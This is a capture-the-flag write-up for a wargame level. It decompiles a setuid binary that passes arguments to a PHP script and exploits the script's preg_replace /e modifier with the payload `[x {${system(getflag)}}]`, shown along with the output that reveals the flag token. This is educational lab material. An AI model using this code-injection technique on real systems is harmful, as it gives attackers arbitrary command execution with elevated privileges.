
with a `ls -la` we can find two file:
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

level06.php is a PHP script
level06 is a not stripped ELF 32-bit LSB executable

we use `scp -P 4242 level06@<ip>:/home/user/level06/level06 ./level06_bin` to download the executable and use `https://dogbolt.org/` to decompile the code.
With a bit of cleaning we get this code:
```c
int main(int argc, const char **argv, const char **envp)
{
  char *cpy_argv_1; // esi
  char *cpy_argv_2; // ebx
  char *execve_args[11]; // [esp+14h] [ebp-2Ch] BYREF

  execve_args[7] = (char *)&argc;
  cpy_argv_1 = strdup("\0");
  cpy_argv_2 = strdup("\0");
  if (argv[1] != NULL)
  {
    free(cpy_argv_1);
    cpy_argv_1 = strdup(argv[1]);
    if (argv[2] != NULL)
    {
      free(cpy_argv_2);
      cpy_argv_2 = strdup(argv[2]);
    }
  }

  egid = getegid();
  euid = geteuid();
  setresgid(egid, egid, egid);
  setresuid(euid, euid, euid);

  execve_args[0] = "/usr/bin/php";
  execve_args[1] = "/home/user/level06/level06.php";
  execve_args[2] = cpy_argv_1;  
  execve_args[3] = cpy_argv_2;
  execve_args[4] = 0;

  execve("/usr/bin/php", execve_args, envp);
  return 0;
}
```

We can see this script is basicly passing argv[1] & argv[2] as args for the PHP script we found:
Let's check the script inself to see what he do:

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

This PHP script is a text transformation tool that:
    - Reads the file
    - Looks for custom syntax (using square brackets)
    - Replaces certain patterns
    - Outputs the result

Here with the `/e` modifier, replacement the string `y(\"\\2\")` is treated as PHP code and executed
That means anything inside `\\2` (the content between `[x ...]`) gets injected into the function call `y("...")`

With that we can create a playload that fit the regex syntax and exectue it using system() or exec():
`[x {${system(getflag)}}]`
With the regex `/e` modifier this becomes:
`y("{${system(getflag)}}")`
Inside double quotes, ${...} is allowed for variable interpolation
`system(getflag)` run and return the interpreted string

With that in mind we create a file with the playload:
`echo \[x \{\$\{system\(getflag\)\}\}\] > /tmp/payload`

And run it:
```bash
./level06 /tmp/payload
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```